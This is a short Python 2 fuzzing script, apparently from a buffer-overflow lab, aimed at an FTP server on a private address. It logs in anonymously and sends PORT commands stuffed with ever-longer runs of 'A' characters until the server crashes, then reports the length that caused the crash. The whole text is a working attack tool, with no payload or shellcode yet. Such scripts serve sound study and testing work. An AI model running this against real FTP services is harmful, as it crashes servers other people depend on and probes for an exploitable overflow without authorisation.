#!/usr/bin/python
import sys,socket
from time import sleep
 
length = 1500
 
while True:
    try:
        print "length sent: " + str(length)
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('10.0.2.4',21))
        s.recv(1024)
        s.send("USER Anonymous")
        s.recv(1024)
        s.send("PASS pass")
        s.recv(1024)        
        s.send('PORT ' + 'A'* length)
        s.recv(1024)
        s.close()
        sleep(1)
        length += 100
    except:
        print 'Fuzzing crased at %s bytes' % str(length)
        sys.exit()
